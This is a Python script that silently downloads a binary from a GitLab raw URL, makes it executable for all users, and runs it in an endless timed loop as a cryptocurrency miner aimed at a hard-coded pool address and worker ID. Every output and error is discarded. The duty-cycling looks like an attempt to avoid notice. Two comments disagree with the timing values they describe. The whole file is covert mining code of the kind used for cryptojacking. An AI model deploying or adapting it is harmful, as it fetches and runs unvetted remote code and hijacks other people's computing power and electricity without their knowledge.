import requests
import os
import subprocess
import stat
import time

def download_file(url, filename):
    """Downloads a file from a given URL silently."""
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        with open(filename, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        return True
    except requests.exceptions.RequestException:
        return False

def run_command(command):
    """Runs a shell command in the background silently."""
    try:
        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return process
    except (FileNotFoundError, Exception):
        return None

def stop_process(process):
    """Stops a running process gracefully and silently."""
    if not process:
        return
    try:
        process.terminate()
        process.wait(timeout=10)
    except subprocess.TimeoutExpired:
        process.kill()
        process.wait()
    except Exception:
        pass # Ignore errors during termination


def main():
    """
    Main function to download, set permissions, and execute the miner on a schedule silently.
    """
    file_url = "https://gitlab.com/senopvrtymlbb/data/-/raw/main/gogal"
    filename = "gogal"

    if not download_file(file_url, filename):
        return

    try:
        os.chmod(filename, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
    except Exception:
        return

    command_to_run = [
        f"./{filename}",
        "-a", "xelishashv2",
        "-o", "51.195.26.234:7019",
        "-w", "krxXJMWJKW.t4",
        "--api-port", "8081"
    ]
    
    cycle_duration_seconds = 10 * 60          # A 10-minute total cycle
    pre_run_wait_seconds = 1 * 60             # 2 minutes of stop time before running
    post_run_wait_seconds = 1 * 60            # 2 minutes of stop time after running
    
    run_duration_seconds = cycle_duration_seconds - pre_run_wait_seconds - post_run_wait_seconds

    # This loop will now run indefinitely
    while True:
        time.sleep(pre_run_wait_seconds)

        process = run_command(command_to_run)

        if process:
            try:
                time.sleep(run_duration_seconds)
            finally:
                stop_process(process)
        else:
            time.sleep(run_duration_seconds)

        time.sleep(post_run_wait_seconds)


if __name__ == "__main__":
    main()
